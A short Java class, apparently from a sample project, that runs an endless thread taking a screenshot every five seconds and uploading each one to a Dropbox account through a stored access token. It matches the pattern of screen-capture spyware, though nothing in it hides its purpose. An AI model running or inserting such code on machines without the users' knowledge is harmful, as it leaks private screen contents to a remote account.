package sample;

import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    public DbxClientV2 client = new DbxClientV2(Config.config, Config.TOKEN);

    @Override
    public void run(){

        for(;;){
            try {
                SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
                Date now = new Date();
                Screenshots screenshots = new Screenshots();
                FileMetadata metadata = client.files().uploadBuilder("/" + formatter.format(now) + ".png")
                        .uploadAndFinish(screenshots.doScreenshots());
                sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
